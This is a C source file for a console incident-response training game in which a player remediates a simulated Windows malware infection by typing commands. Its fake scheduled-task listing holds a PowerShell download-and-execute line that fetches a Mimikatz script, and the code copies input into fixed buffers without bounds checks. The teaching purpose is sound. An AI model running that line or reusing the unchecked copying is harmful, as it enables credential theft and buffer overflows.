#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>

#define MAX_ARGS 10
#define MAX_LENGTH 256


void mainMenu() {
    char *menuPage = 
            "\n\n"
            "====================================================\n"
            "|   CyberResponder Playbook Console //////         |\n"
            "| ================================================ |\n"
            "|   1. Respond  <--------------------------------- |\n"
            "|   2. Playbook  <-------------------------------- |\n"
            "|   3. Exit  <------------------------------------ |\n"
            "====================================================\n";

    printf("%s", menuPage);
    printf("Please select an option:\n");
    //fgets(userMenuInput, size, stdin);
    //userMenuInput[strcspn(userMenuInput, "\n")] = 0;
    return;
}


void helpMenu() {

    char *helpPage = 
        "=================================================================\n"
        "| Command       | Description                                   |\n"
        "|===============================================================|\n"
        "| del           | Delete a file or folder.                      |\n"
        "| dir           | Enumerate a folder (directory).               |\n"
        "| mstsc         | Interactively connect to a remote desktop.    |\n"
        "| schtasks      | Manage scheduled tasks.                       |\n" 
        "| tasklist      | List the processes.                           |\n"
        "| taskkill      | Kill a process.                               |\n"
        "=================================================================\n";
    printf("%s", helpPage);
    return;
}


char *userInput(char *command, size_t size) {
    do {
        printf("> ");
        if (fgets(command, size, stdin) == NULL) {
            return command;
        }
        command[strcspn(command, "\n")] = 0;
    } while (strlen(command) == 0);
    return command;
}


void strToLower (char *str) {
    while (*str) {
        *str = tolower((unsigned char)*str);
        str++;
    }
}


char *trimStr(char *str) {
    char *endStr;

    while (isspace((unsigned char)*str)) {
        str++;
    }

    if (*str == '\0') {
        return str;
    }

    endStr = str + strlen(str) - 1;
    while (endStr > str && isspace((unsigned char)*endStr)) {
        endStr--;
    }
    *(endStr + 1) = '\0';

    return str;
}


int parseCmd(char *cmd, char *args[MAX_ARGS]) {
    char *pointer = cmd;
    char *pointerStart = cmd;
    int argsCounter = 0;
    int spaceCounter = 0;

    while (*pointer) {
        if (isspace((unsigned char)*pointer) && spaceCounter < 1) {
            *pointer = '\0';
            if (*pointerStart != '\0') {
                pointerStart = trimStr(pointerStart);
                strToLower(pointerStart);
                args[argsCounter++] = pointerStart;
            }
            pointerStart = pointer + 1;
            spaceCounter++;
        } else if (*pointer == '/') {
            *pointer = '\0';
            if (*pointerStart != '\0') {
                pointerStart = trimStr(pointerStart);
                strToLower(pointerStart);
                args[argsCounter++] = pointerStart;
            }
            pointerStart = pointer + 1; 
        }
        pointer++;
    }

    if (*pointerStart != '\0') {
        pointerStart = trimStr(pointerStart);
        strToLower(pointerStart);
        args[argsCounter++] = pointerStart;
    }

    return argsCounter;
}


int compareCmd(char *cmd, char *ans) {
    char cmdBuffer[MAX_LENGTH];
    char ansBuffer[MAX_LENGTH];
    char *cmdArgs[MAX_ARGS], *ansArgs[MAX_ARGS];

    strcpy(cmdBuffer, cmd);
    strcpy(ansBuffer, ans);

    int cmdCounter = parseCmd(cmdBuffer, cmdArgs);
    int ansCounter = parseCmd(ansBuffer, ansArgs);

    if (cmdCounter == 0 || ansCounter == 0 || strcmp(cmdArgs[0], ansArgs[0]) != 0) {
        return 0;
    }

    int matchTrack[MAX_ARGS] = {0};
    for (int i = 1; i < ansCounter; i++) {
        int matched = 0;
        for (int j = 1; j < cmdCounter; j++) {
            if (!matchTrack[j] && strcmp(ansArgs[i], cmdArgs[j]) == 0){
                matchTrack[j] = 1;
                matched = 1;
                break;
            }
        }
        if (!matched) {
            return 0;
        }
    }

    return 1;
}


int processInput(char *command, size_t size, char *answer, int *life) {
    char *input = userInput(command, size);
    int checkAns = compareCmd(input, answer);

    while (checkAns == 0) {
        if (strcmp(input, "back") == 0) {
            return 0;
        } else if (strcmp(input, "help") == 0) {
            helpMenu();
        } else {
            (*life)++;
            printf("Wrong or unrecognized command. Please try again.\n");
            if (*life >= 3) {
                printf("\nGame over. You have been compromised!");
                return 0;
            }
        }
        input = userInput(command, size);
        checkAns = compareCmd(input, answer);
    }

    return 1;
}


void scenarioOne() {
    int status;
    int life = 0;
    char command[200];
    char *answer;
    char *scenarioBackground = 
            "\n\nCASE IR001: UNKNOWN MALWARE INFECTION ON A WORKSTATION\n"
            "Meeps Security has identified that endpoint CORP\\WST1 (192.168.50.100) has been compromised by a malware.\n"
            "According to the client's Cyber Threat Intelligence group, the malware is known to spoof well-known Microsoft\n"
            "processes. It was also observed that the threat actor behind the attack uses scheduled tasks to maintain per-\n"
            "sistence.\n\n"
            "OSINT research also showed that organizations that have been compromised by the same threat actor reported\n"
            "a suspicious 'Temp' folder located in the root drive, where the exfiltrated data is being staged. Furthermore,\n"
            "an adisory from CISA confirms that the threat actor utilizes EC2 instances for command & control (C2).\n\n"
            "As one of the incident responders, follow the response playbook to remediate the risk.\n";

    printf ("%s", scenarioBackground);
    printf("\n1. Beginning the response, connect to the infected machine as an admin via RDP using the IP address and default port.\n");
    answer = "mstsc /v:192.168.50.100 /admin";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        printf("Connecting to CORP\\WST1 as an admin...\nConnected!\n");
    } else {
        return;
    }
    


    printf("\n2. Identify the running processes in the infected machine.\n");
    answer = "tasklist /fi \"status eq running\"";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        char *runningProcesses = 
                "Running Processes:\n"
                "====================================================\n"
                "| Image Name          | PID     | Mem Usage        |\n"
                "====================================================\n"
                "| explorer.exe        | 11600   | 257,520 K        |\n"
                "| msedge.exe          | 6556    | 310,000 K        |\n"
                "| explorerr.exe       | 4496    | 769,334 K        |\n"
                "====================================================\n";
        printf("%s", runningProcesses);
    } else {
        return;
    }


    printf("\n3. Analyze the list of running processes, identify which is malicious, and kill it with its PID.\n");
    answer = "taskkill /pid 4496";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        printf ("Process explorerr.exe:4496 successfully killed.\n");
    } else {
        return;
    }

    printf("\n4. Knowing the method of persistence employed by the threat actor, list the configured scheduled tasks in the system in verbose mode.\n");
    answer = "schtasks /query /v";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        char *scheduledTasks = 
                "Scheduled Tasks:\n"
                "==================================================================================================\n"
                "| Task Name      | Author     | Trigger              | Task to Run                               |\n"
                "==================================================================================================\n"
                "| npcapwatchdog  | UncleSocks | At system startup    | C:\\Program Files\\Npcap\\CheckStatus.bat    |\n"
                "| MSUpdate       | UncleSocks | At logon of any      | C:\\Windows\\System32\\powershell.exe IEX    |\n"
                "|                                                      ((new-object netwebclient).downloadstring |\n"
                "|                                                      (https://ec2.aws.com/Mimikatz.ps1         |\n"
                "| MSEdgeUpdate   |            | At 1:30 PM every day | C:\\Program Files (x86)\\Microsoft\\Edge     |\n"
                "|                                                      Update\\MicrosoftEdgeUpdate.exe \\c         |\n"
                "==================================================================================================\n";
            printf("%s", scheduledTasks);
    } else {
        return;
    }

    printf("\n5. Identify and delete the scheduled task used for persistence.\n");
    answer = "schtasks /delete /tn MSUpdate";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        printf ("Scheduled task 'MSUpdate' successfully deleted.\n");
    }

    printf("\n6. Enumerate the contents of the Temp directory of user 'wapols.'\nNote: Make sure to add the trailing '\\' character.\n");
    answer = "dir C:\\Users\\wapols\\AppData\\Local\\Temp\\";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        char *tempDir = 
                "Directory of C:\\Users\\wapols\\AppData\\Local\\Temp\n"
                "=================================================================\n"
                "| Date Modified       | Type     | Size        | Name           |\n"
                "=================================================================\n"
                "| 01/07/2025 9:13 AM  | <DIR>    |             | .              |\n"
                "| 01/07/2025 9:13 AM  | <DIR>    |             | ..             |\n"
                "| 03/06/2025 3:15 PM  |          | 128,382     | 170D-0ds3.tmp  |\n"
                "| 03/09/2025 3:18 AM  |          | 137,901     | 200T-992f.tmp  |\n"
                "| 10/15/2025 10:15 PM |          | 894,100,211 | 436Pds.dll     |\n"
                "| 05/16/2025 9:08 AM  |          | 98,910      | cdstmp_1041.gz |\n"
                "| 05/16/2025 9:12 AM  |          | 100,485     | clsctt_2041.gz |\n"
                "| 09/30/2025 8:15 AM  | <DIR>    |             | lfuwih.sdr     |\n"
                "=================================================================\n";

        printf("%s", tempDir);
    } else {
        return;
    }

    printf("\n7. Identify and delete the malicious binary in the user's Temp folder.\n");
    answer = "del C:\\Users\\wapols\\AppData\\Local\\Temp\\436Pds.dll";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        printf("File '436Pds.dll' successfully deleted.\n");
    } else {
        return;
    }

    printf("\n8. Identify and confirm the directory where the threat actor is staging the data to be exfiltrated.\n");
    answer = "dir C:\\Temp\\";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        char *exfilDir = 
                "Directory of C:\\Users\\wapols\\AppData\\Local\\Temp\n"
                "=================================================================\n"
                "| Date Modified       | Type     | Size        | Name           |\n"
                "=================================================================\n"
                "| 01/07/2025 9:13 AM  | <DIR>    |             | .              |\n"
                "| 01/07/2025 9:13 AM  | <DIR>    |             | ..             |\n"
                "| 10/15/2025 11:09 PM |          | 91,732      | hashedCred.txt |\n"
                "| 10/15/2025 11:11 PM |          | 33,180,221  | lsass.dmp      |\n"
                "=================================================================\n";
        printf("%s", exfilDir);
    } else {
        return;
    }

    printf("\n9. Delete the 'Temp' directory with the exfiltrated files.\n");
    answer = "rmdir C:\\Temp\\ /s";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        printf("Directory 'C:\\Temp' successfully deleted.\n");
    } else {
        return;
    }

    printf("\n10. To further remediate the risk of re-compromise, reset the password of the affected user to 'T3mpP@ss'\n");
    answer = "net user wapols T3mpP@ss";
    status = processInput(command, sizeof(command), answer, &life);
    if (status == 1) {
        printf("Password for user 'wapols' has been changed.");
    } else {
        return;
    }



    printf("Risk has been remediated.\n");
    printf("Returning to main menu...");
    return;

}


int main() {
    int running = 1;
    char menuSelected[MAX_LENGTH];
    mainMenu();
    while (running == 1) {
        userInput(menuSelected, sizeof(menuSelected));
        strToLower(menuSelected);
        if ((strcmp(menuSelected, "respond") == 0) || (strcmp(menuSelected, "1") == 0)) {
            scenarioOne();
            mainMenu();
        } else if ((strcmp(menuSelected, "playbook") == 0) || (strcmp(menuSelected, "2") == 0)) {
            printf("Go to playbook...");
            mainMenu();
        } else if ((strcmp(menuSelected, "exit") == 0) || (strcmp(menuSelected, "3") == 0)) {
            printf("Exiting...");
            running = 0;
        } else {
            printf("Invalid option selected. Please try again.\n");
        }
    }
    return 0;
}